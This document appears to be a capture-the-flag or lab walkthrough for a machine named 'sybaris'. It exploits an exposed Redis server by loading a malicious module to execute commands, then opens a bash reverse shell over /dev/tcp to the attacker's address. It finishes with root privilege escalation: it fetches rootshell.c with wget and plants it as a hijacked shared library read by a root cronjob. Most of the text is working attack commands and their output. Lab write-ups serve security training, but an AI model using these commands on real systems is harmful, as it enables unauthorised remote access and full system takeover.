### redis-rogue-server
https://github.com/A1vinSmith/redis-rogue-server

no working directly
```bash
python3 redis-rogue-server.py --rhost 192.168.200.93 --rport 6379 --lhost 192.168.49.200 --lport 6379
```

but working with the load module
```bash
❯ redis-cli -h $IP
192.168.200.93:6379> MODULE LOAD /var/ftp/pub/exp.so
OK
192.168.200.93:6379> MODULE LIST
1) 1) "name"
   2) "system"
   3) "ver"
   4) (integer) 1
192.168.200.93:6379> system.exec "id"
"uid=1000(pablo) gid=1000(pablo) groups=1000(pablo)\n"
192.168.200.93:6379> 
```

### reverse shell
```bash
192.168.200.93:6379> system.exec "which nc"
""
192.168.200.93:6379> system.exec "bash -i >& /dev/tcp/192.168.49.200/6379 0>&1"

❯ nc -lvnp 6379
listening on [any] 6379 ...
connect to [192.168.49.200] from (UNKNOWN) [192.168.200.93] 57842
bash: no job control in this shell
[pablo@sybaris /]$ 
```

### Privilege Escalation (Shared Libraries very similar to Malbec PE)
* Malbec is dynamic library hijacking of an SUID Linux binary with `LD_PRELOAD` or a cronjob of `/sbin/ldconfig` that hooks the `module.so`. 
* Shared Object hijacking is `readelf -d /usr/bin/log-sweeper | grep PATH`. That load from custom locations.
* Check HTB Academy module for details

```bash
[pablo@sybaris opt]$ cat /etc/crontab
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
LD_LIBRARY_PATH=/usr/lib:/usr/lib64:/usr/local/lib/dev:/usr/local/lib/utils  <- LD_LIBRARY_PATH
MAILTO=""

# For details see man 4 crontabs

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed
  *  *  *  *  * root       /usr/bin/log-sweeper

[pablo@sybaris opt]$ ldd /usr/bin/log-sweeper
        linux-vdso.so.1 =>  (0x00007ffd019ee000)
        utils.so => not found
        libc.so.6 => /lib64/libc.so.6 (0x00007f40283b5000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f4028783000)
```

### Find writable path in LD_LIBRARY_PATH
```bash
find / -type d -writable 2>/dev/null
```

`/usr/local/lib/dev` <- This one is in the path

```bash
wget http://192.168.49.200/rootshell.c

gcc rootshell.c -o utils.so -shared -Wall -fPIC -w

mv utils.so /usr/local/lib/dev/utils.so
```